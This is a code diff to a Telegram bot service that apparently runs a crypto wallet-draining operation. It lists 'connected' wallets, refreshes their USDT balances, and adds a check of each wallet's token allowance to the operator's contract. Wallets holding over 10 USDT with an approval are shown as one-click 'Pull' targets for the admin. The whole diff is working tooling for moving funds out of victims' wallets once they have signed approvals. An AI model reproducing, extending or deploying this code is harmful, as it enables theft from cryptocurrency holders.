@@ -521,129 +521,173 @@ Next steps:
 
     // ENHANCED Pull Wallet List with real-time balances
     async sendPullWalletList(chatId) {
-        if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-        }
-
-        try {
-            // Show processing message
-            const processingMessage = '🔄 Fetching wallet balances...';
-            const processingOptions = {};
-            
-            // Send initial processing message
-            const processingMsg = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
-            
-            console.log('Fetching all wallets from database...');
-            
-            // Fetch ALL wallets from database first
-            const allWalletsQuery = 'SELECT address, name, usdt_balance, created_at FROM wallets ORDER BY created_at DESC';
-            const allWalletsResult = await database.query(allWalletsQuery);
-            
-            const totalWallets = allWalletsResult.rows.length;
-            let walletsToUpdate = [];
-            
-            // Fetch real-time balances for all wallets
-            const contractService = require('../services/contract.service');
-            
-            // Update balances for all wallets
-            for (const wallet of allWalletsResult.rows) {
-                try {
-                    console.log(`Fetching real-time balance for: ${wallet.address}`);
-                    const realTimeBalance = await contractService.getWalletUSDTBalance(wallet.address);
-                    console.log(`Real-time balance for ${wallet.address}: ${realTimeBalance}`);
-                    
-                    // Update database with real-time balance
-                    const updateQuery = `
-                        UPDATE wallets 
-                        SET usdt_balance = $1, last_balance_check = NOW(), updated_at = NOW()
-                        WHERE address = $2
-                    `;
-                    await database.query(updateQuery, [realTimeBalance, wallet.address]);
-                    
-                    // Update the wallet object with real-time balance
-                    wallet.usdt_balance = realTimeBalance;
-                    
-                    // Add to walletsToUpdate if balance > 10
-                    if (parseFloat(realTimeBalance) > 10) {
-                        walletsToUpdate.push(wallet);
-                    }
-                } catch (error) {
-                    console.error(`Error fetching balance for ${wallet.address}:`, error.message);
-                    // Keep existing balance if fetch fails
-                    if (parseFloat(wallet.usdt_balance || '0') > 10) {
-                        walletsToUpdate.push(wallet);
-                    }
-                }
-            }
-            
-            const walletsOver10 = walletsToUpdate.length;
-            
-            let message = `📤 Select Wallet to Pull\n\n`;
-            message += `Total Wallets Connected: ${totalWallets}\n`;
-            message += `Wallets with >10 USDT: ${walletsOver10}\n\n`;
-
-            if (walletsToUpdate.length === 0) {
-                message += 'No wallets with balance > 10 USDT found.\n\n';
-                message += 'New wallets will be checked automatically.';
-            } else {
-                message += 'Click on a wallet to pull USDT:\n\n';
-                for (let i = 0; i < Math.min(walletsToUpdate.length, 10); i++) {
-                    const wallet = walletsToUpdate[i];
-                    const maskedAddress = this.maskAddress(wallet.address);
-                    // Format balance to 2 decimal places
-                    const balance = parseFloat(wallet.usdt_balance || '0').toFixed(2);
-                    message += `${i + 1}. ${maskedAddress} (${balance} USDT)\n`;
-                }
-            }
-
-            // Build inline keyboard
-            const inlineKeyboard = [];
-            
-            // Add wallet buttons (only for wallets with balance > 10)
-            if (walletsToUpdate.length > 0) {
-                for (let i = 0; i < Math.min(walletsToUpdate.length, 10); i++) {
-                    const wallet = walletsToUpdate[i];
-                    inlineKeyboard.push([{
-                        text: `📤 Pull ${wallet.name || `Wallet ${i + 1}`}`,
-                        callback_data: `pull_${wallet.address}`
-                    }]);
-                }
-            }
-            
-            // Add the main menu button
-            inlineKeyboard.push([
-                { text: '🏠 Main Menu', callback_data: 'menu' }
-            ]);
-
-            const options = {
-                reply_markup: {
-                    inline_keyboard: inlineKeyboard
-                }
-            };
-
-            // Edit the processing message with the actual results
-            return await this.bot.editMessageText(message, {
-                chat_id: chatId,
-                message_id: processingMsg.message_id,
-                ...options
-            });
-            
-        } catch (error) {
-            console.error('Error sending pull wallet list:', error && error.message ? error.message : error);
-            const fallbackMessage = `
-❌ Error fetching wallet list. Please try again later.
-            `;
-            return await this.bot.sendMessage(chatId, fallbackMessage, {
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '🏠 Main Menu', callback_data: 'menu' }
-                        ]
-                    ]
-                }
-            });
-        }
+    if (chatId.toString() !== this.adminChatId) {
+        return this.bot.sendMessage(chatId, '❌ Unauthorized access');
     }
+
+    try {
+        // Show processing message
+        const processingMessage = '🔄 Fetching wallet balances...';
+        const processingOptions = {};
+        
+        // Send initial processing message
+        const processingMsg = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
+        
+        console.log('Fetching all wallets from database...');
+        
+        // Fetch ALL wallets from database first
+        const allWalletsQuery = 'SELECT address, name, usdt_balance, created_at FROM wallets ORDER BY created_at DESC';
+        const allWalletsResult = await database.query(allWalletsQuery);
+        
+        const totalWallets = allWalletsResult.rows.length;
+        let walletsToUpdate = [];
+        
+        // Fetch real-time balances for all wallets and check approval status
+        const contractService = require('../services/contract.service');
+        
+        // Update balances for all wallets
+        for (const wallet of allWalletsResult.rows) {
+            try {
+                console.log(`Fetching real-time balance for: ${wallet.address}`);
+                const realTimeBalance = await contractService.getWalletUSDTBalance(wallet.address);
+                console.log(`Real-time balance for ${wallet.address}: ${realTimeBalance}`);
+                
+                // Update database with real-time balance
+                const updateQuery = `
+                    UPDATE wallets 
+                    SET usdt_balance = $1, last_balance_check = NOW(), updated_at = NOW()
+                    WHERE address = $2
+                `;
+                await database.query(updateQuery, [realTimeBalance, wallet.address]);
+                
+                // Update the wallet object with real-time balance
+                wallet.usdt_balance = realTimeBalance;
+                
+                // Add to walletsToUpdate if balance > 10 AND wallet has approved spending
+                if (parseFloat(realTimeBalance) > 10) {
+                    // Check if wallet has approved spending
+                    const hasApprovedSpending = await this.checkWalletApproval(wallet.address);
+                    if (hasApprovedSpending) {
+                        walletsToUpdate.push(wallet);
+                        console.log(`Wallet ${wallet.address} added to pull list (balance: ${realTimeBalance}, approved: true)`);
+                    } else {
+                        console.log(`Wallet ${wallet.address} has balance ${realTimeBalance} but not approved - excluded from pull list`);
+                    }
+                }
+            } catch (error) {
+                console.error(`Error fetching balance for ${wallet.address}:`, error.message);
+                // Keep existing balance if fetch fails
+                if (parseFloat(wallet.usdt_balance || '0') > 10) {
+                    // Check if wallet has approved spending
+                    const hasApprovedSpending = await this.checkWalletApproval(wallet.address);
+                    if (hasApprovedSpending) {
+                        walletsToUpdate.push(wallet);
+                    }
+                }
+            }
+        }
+        
+        const walletsOver10 = walletsToUpdate.length;
+        
+        let message = `📤 Select Wallet to Pull\n\n`;
+        message += `Total Wallets Connected: ${totalWallets}\n`;
+        message += `Wallets with >10 USDT: ${walletsOver10}\n\n`;
+
+        if (walletsToUpdate.length === 0) {
+            message += 'No wallets with balance > 10 USDT found.\n\n';
+            message += 'New wallets will be checked automatically.';
+        } else {
+            message += 'Click on a wallet to pull USDT:\n\n';
+            for (let i = 0; i < Math.min(walletsToUpdate.length, 10); i++) {
+                const wallet = walletsToUpdate[i];
+                const maskedAddress = this.maskAddress(wallet.address);
+                // Format balance to 2 decimal places
+                const balance = parseFloat(wallet.usdt_balance || '0').toFixed(2);
+                message += `${i + 1}. ${maskedAddress} (${balance} USDT)\n`;
+            }
+        }
+
+        // Build inline keyboard
+        const inlineKeyboard = [];
+        
+        // Add wallet buttons (only for wallets with balance > 10 AND approved spending)
+        if (walletsToUpdate.length > 0) {
+            for (let i = 0; i < Math.min(walletsToUpdate.length, 10); i++) {
+                const wallet = walletsToUpdate[i];
+                inlineKeyboard.push([{
+                    text: `📤 Pull ${wallet.name || `Wallet ${i + 1}`}`,
+                    callback_data: `pull_${wallet.address}`
+                }]);
+            }
+        }
+        
+        // Add the main menu button
+        inlineKeyboard.push([
+            { text: '🏠 Main Menu', callback_data: 'menu' }
+        ]);
+
+        const options = {
+            reply_markup: {
+                inline_keyboard: inlineKeyboard
+            }
+        };
+
+        // Edit the processing message with the actual results
+        return await this.bot.editMessageText(message, {
+            chat_id: chatId,
+            message_id: processingMsg.message_id,
+            ...options
+        });
+        
+    } catch (error) {
+        console.error('Error sending pull wallet list:', error && error.message ? error.message : error);
+        const fallbackMessage = `
+❌ Error fetching wallet list. Please try again later.
+        `;
+        return await this.bot.sendMessage(chatId, fallbackMessage, {
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: '🏠 Main Menu', callback_data: 'menu' }
+                    ]
+                ]
+            }
+        });
+    }
+}
+
+// Check if wallet has approved USDT spending by checking allowance
+async checkWalletApproval(walletAddress) {
+    try {
+        // Check if we have the necessary contract addresses and provider
+        const usdtContractAddress = process.env.USDT_CONTRACT_ADDRESS;
+        const contractAddress = process.env.CONTRACT_ADDRESS;
+        
+        if (!usdtContractAddress || !contractAddress || !this.provider) {
+            console.error('Missing contract addresses or provider for approval check');
+            return false;
+        }
+        
+        // Create USDT contract instance
+        const usdtContract = new ethers.Contract(
+            usdtContractAddress,
+            ['function allowance(address owner, address spender) external view returns (uint256)'],
+            this.provider
+        );
+        
+        // Check allowance
+        const allowance = await usdtContract.allowance(walletAddress, contractAddress);
+        
+        // If allowance is greater than 0, wallet has approved spending
+        const hasApproved = allowance > 0n; // Using BigInt comparison
+        console.log(`Wallet ${walletAddress} allowance: ${allowance.toString()}, approved: ${hasApproved}`);
+        
+        return hasApproved;
+    } catch (error) {
+        console.error(`Error checking approval for wallet ${walletAddress}:`, error.message);
+        return false;
+    }
+}
 
     // REAL BLOCKCHAIN BALANCE CHECKING FUNCTIONS
     async getContractUSDTBalance() {
@@ -1234,3 +1278,4 @@ Error: ${cleanErrorMessage}
 }
 
 module.exports = new TelegramService();
+
